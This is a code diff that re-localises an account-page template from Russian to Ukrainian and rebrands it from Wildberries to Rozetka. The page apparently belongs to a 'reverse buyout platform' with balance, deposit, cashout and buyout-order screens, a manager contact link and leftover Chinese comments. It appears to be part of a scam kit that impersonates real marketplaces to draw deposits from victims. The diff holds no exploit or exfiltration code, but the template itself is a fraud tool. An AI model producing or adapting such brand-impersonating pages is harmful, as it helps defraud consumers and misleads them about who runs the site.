@@ -16,12 +16,12 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>персональный центр - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
+	<title>особистий кабінет - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
 	<meta name="description"
-		content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+		content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -33,7 +33,7 @@
 <body>
 	<div class="content" style="margin-bottom:62px;">
 		<div class="user_info">
-			<div class="user_tt">Профиль</div>
+			<div class="user_tt">Профіль</div>
 			<div class="user_tx_box">
 				<div class="user_tx">
 					<!-- <a href="user.php?mod=setting&act=logo"> --><img
@@ -50,25 +50,25 @@
 		<div class="side_all">
 
 			<div class="nav">
-				<a class="tgdd_tt" href="<?php echo route("order") ?>"><span class="fl">Мой заказ</span><span
-						class="fr c888 font13">Узнать более</span><i class="more_jt"></i></a>
+				<a class="tgdd_tt" href="<?php echo route("order") ?>"><span class="fl">Моє замовлення</span><span
+						class="fr c888 font13">Дізнатися більше</span><i class="more_jt"></i></a>
 				<ul style="display:flex; justify-content: space-between;">
-					<li><a href="<?php echo route("order") ?>"><i class="user_tb4"></i>ещё не
-							оплаченные <span> 1</span>
+					<li><a href="<?php echo route("order") ?>"><i class="user_tb4"></i>ще не
+							оплачені <span> 1</span>
 						</a></li>
-					<li><a href="<?php echo route("order") ?>"><i class="user_tb2"></i>ещё не
-							искуплен</a></li>
+					<li><a href="<?php echo route("order") ?>"><i class="user_tb2"></i>ще не
+							викуплені</a></li>
 
-					<li><a href="<?php echo route("order") ?>"><i class="user_tb3"></i>уже
-							искуплен</a></li>
+					<li><a href="<?php echo route("order") ?>"><i class="user_tb3"></i>вже
+							викуплені</a></li>
 				</ul>
 				<div class="clear"></div>
 			</div>
 			<div class="nav">
-				<a class="tgdd_tt" href="<?php echo route("history") ?>"><span class="fl">Мой кошелек</span></a>
+				<a class="tgdd_tt" href="<?php echo route("history") ?>"><span class="fl">Мій гаманець</span></a>
 				<div class="side_fh1">
-					<a><span>{{ $user->balance }} ₾.</span>баланс</a>
-					<a><span>0 </span>Точки</a>
+					<a><span>{{ $user->balance }} ₴.</span>баланс</a>
+					<a><span>0 </span>Бали</a>
 					<a><span>0</span>купон</a>
 					<div class="clear"></div>
 				</div>
@@ -79,33 +79,33 @@
 			<div class="ck_nav mat10">
 				<ul>
 
-					<li><a href="<?php echo route("deposit") ?>"><i class="user_tb11"></i>Пополнить<p></p></a></li>
-					<li><a href="<?php echo route("cashout") ?>"><i class="user_tb12"></i>снятие<p>
+					<li><a href="<?php echo route("deposit") ?>"><i class="user_tb11"></i>Поповнити<p></p></a></li>
+					<li><a href="<?php echo route("cashout") ?>"><i class="user_tb12"></i>зняття<p>
 							</p></a></li>
-					<li><a href="<?php echo route("history") ?>"><i class="user_tb5"></i>История<p></p></a></li>
-					<li><a href="<?php echo route("settings") ?>"><i class="ck_i4"></i><span>настройки</span>
+					<li><a href="<?php echo route("history") ?>"><i class="user_tb5"></i>Історія<p></p></a></li>
+					<li><a href="<?php echo route("settings") ?>"><i class="ck_i4"></i><span>налаштування</span>
 							<p></p>
 						</a></li>
 					<!-- <li><a href="http://wildberriesrefund.com/"><i class="ck_i7"></i><span>退税</span><p></p></a></li> -->
 
-					<li><a href="<?php echo route("payment.methods") ?>"><i class="user_tb1"></i><span>платежного
-								счета</span>
+					<li><a href="<?php echo route("payment.methods") ?>"><i class="user_tb1"></i><span>платіжного
+								рахунку</span>
 							<p></p>
 						</a></li>
 
 					<!-- <li><a href="user.php?mod=comment"><i class="ck_i1"></i><span>我的评价</span><p></p></a></li> -->
 					<!-- <li><a href=""><i class="ck_i3"></i><span>Поддержка</span><p></p></a></li> -->
-					<li><a href="{{ $settings->linkManager }}"><i class="ck_i3"></i><span>Поддержка</span>
+					<li><a href="{{ $settings->linkManager }}"><i class="ck_i3"></i><span>Підтримка</span>
 							<p></p>
 						</a></li>
-					<li><a href="<?php echo route("favorites") ?>"><i class="ck_i7"></i><span>Избранное</span>
+					<li><a href="<?php echo route("favorites") ?>"><i class="ck_i7"></i><span>Обране</span>
 							<p></p>
 						</a></li>
-					<li><a href="<?php echo route("delivery") ?>"><i class="ck_i5"></i><span>Адреса
+					<li><a href="<?php echo route("delivery") ?>"><i class="ck_i5"></i><span>Адреси
 								доставки</span>
 							<p></p>
 						</a></li>
-					<li><a href="<?php echo route("about_us") ?>"><i class="ck_i6"></i><span>насчет нас</span>
+					<li><a href="<?php echo route("about_us") ?>"><i class="ck_i6"></i><span>про нас</span>
 							<p></p>
 						</a></li>
 				</ul>
@@ -114,19 +114,19 @@
 			<div class="ck_nav_xian"></div>
 			<div class="side_ul mat10 mab10" style="display:none">
 				<ul>
-					<li class="side_i2"><a href="https://wbbff.cc/user.php?mod=comment">我的评价<span></span><i></i></a>
+					<li class="side_i2"><a href="https://wbbff.cc/user.php?mod=comment">мої відгуки<span></span><i></i></a>
 					</li>
-					<li class="side_i1"><a href="<?php echo route("favorites") ?>">Избранное<span></span><i></i></a>
+					<li class="side_i1"><a href="<?php echo route("favorites") ?>">Обране<span></span><i></i></a>
 					</li>
-					<li class="side_i3"><a href="<?php echo route("payment.methods") ?>">платежного
-							счета<span></span><i></i></a></li>
+					<li class="side_i3"><a href="<?php echo route("payment.methods") ?>">платіжного
+							рахунку<span></span><i></i></a></li>
 					<li class="side_i4"><a href="<?php echo route("delivery") ?>">список
-							адресов<span></span><i></i></a></li>
-					<li class="side_i5"><a href="<?php echo route("settings") ?>">настройки<span></span><i></i></a>
+							адрес<span></span><i></i></a></li>
+					<li class="side_i5"><a href="<?php echo route("settings") ?>">налаштування<span></span><i></i></a>
 					</li>
 					<!-- <li><a href="user.php?mod=useraddr"><i class="ck_i3"></i><span>Адреса доставки</span><p></p></a></li> -->
 
-					<li class="side_i7"><a href="<?php echo route("auth.logout") ?>">выйти<span></span><i></i></a></li>
+					<li class="side_i7"><a href="<?php echo route("auth.logout") ?>">вийти<span></span><i></i></a></li>
 				</ul>
 			</div>
 		</div>
@@ -158,7 +158,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//верхнє меню клік
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -174,13 +174,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
